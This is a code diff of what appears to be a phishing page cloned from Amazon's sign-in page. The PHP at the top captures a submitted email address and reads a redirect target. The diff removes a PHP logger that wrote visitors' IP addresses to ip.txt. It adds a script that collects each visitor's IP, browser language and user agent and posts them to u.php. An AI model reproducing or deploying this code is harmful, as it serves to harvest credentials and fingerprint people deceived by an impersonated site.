@@ -1,44 +1,4 @@
 <?php
-function get_IP_address()
-{
-    /*foreach (array('HTTP_CLIENT_IP',
-                   'HTTP_X_FORWARDED_FOR',
-                   'HTTP_X_FORWARDED',
-                   'HTTP_X_CLUSTER_CLIENT_IP',
-                   'HTTP_FORWARDED_FOR',
-                   'HTTP_FORWARDED',
-                   'REMOTE_ADDR') as $key){
-        if (array_key_exists($key, $_SERVER) === true){
-            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
-                $IPaddress = trim($IPaddress); // Just to be safe
-
-                if (filter_var($IPaddress,
-                               FILTER_VALIDATE_IP,
-                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
-                    !== false) {
-
-                    return $IPaddress;
-                }
-            }
-        }
-    }*/
-    if (!empty($_SERVER['HTTP_CLIENT_IP']))
-  {
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-  }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-  {
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-  }
-else
-  {
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-  }
-  return $ipaddress;
-}
-fwrite(fopen('ip.txt','w'),get_IP_address());
-?>
-<?php
 $u = $_POST['email'];
 if($u){
   $r = fread(fopen('redir.txt','r'),filesize("redir.txt"));
@@ -738,7 +698,29 @@ csa.plugin(function(e){var i="transitionStart",n="pageVisible",t="PageTiming",a=
 </script>
 
 </div>
-
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
+</script>
 <noscript>
     <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:136-0636727-0142044:J5SKQCNNP1YR5J0XPHEW$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DJ5SKQCNNP1YR5J0XPHEW:0' alt=""/>
 </noscript>
